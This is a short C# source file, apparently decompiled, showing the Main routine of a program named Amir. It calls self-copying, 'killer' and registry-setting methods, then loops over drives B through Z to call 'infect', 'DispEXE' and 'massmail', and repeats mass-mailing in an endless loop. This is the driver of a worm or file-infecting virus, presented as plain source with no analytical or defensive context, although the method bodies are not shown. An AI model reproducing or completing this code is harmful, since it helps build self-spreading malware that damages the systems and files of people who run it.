using System;
using System.IO;
using System.Threading;

namespace Amir;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Amir amir = new Amir();
		amir.ccopy();
		amir.happy();
		amir.killer();
		amir.regist2();
		amir.regist3();
		amir.setreg();
		amir.setreg7();
		amir.setreg8();
		amir.setreg9();
		for (char c = 'B'; c <= 'Z'; c = (char)(c + 1))
		{
			string text = c + ":\\";
			if (Directory.Exists(text))
			{
				try
				{
					amir.DispEXE(text);
				}
				catch (Exception)
				{
					amir.killer();
				}
			}
		}
		for (char c2 = 'B'; c2 <= 'Z'; c2 = (char)(c2 + 1))
		{
			string text2 = c2 + ":\\";
			if (Directory.Exists(text2))
			{
				try
				{
					amir.infect(text2);
				}
				catch (Exception)
				{
					amir.killer();
				}
			}
		}
		for (char c3 = 'B'; c3 <= 'Z'; c3 = (char)(c3 + 1))
		{
			string text3 = c3 + ":\\";
			if (Directory.Exists(text3))
			{
				try
				{
					amir.massmail(text3);
				}
				catch (Exception)
				{
					amir.killer();
				}
			}
		}
		while (true)
		{
			for (char c4 = 'B'; c4 <= 'Z'; c4 = (char)(c4 + 1))
			{
				string text4 = c4 + ":\\";
				if (Directory.Exists(text4))
				{
					try
					{
						amir.massmail(text4);
					}
					catch (Exception)
					{
						amir.killer();
						Thread.Sleep(40000);
					}
				}
			}
		}
	}
}
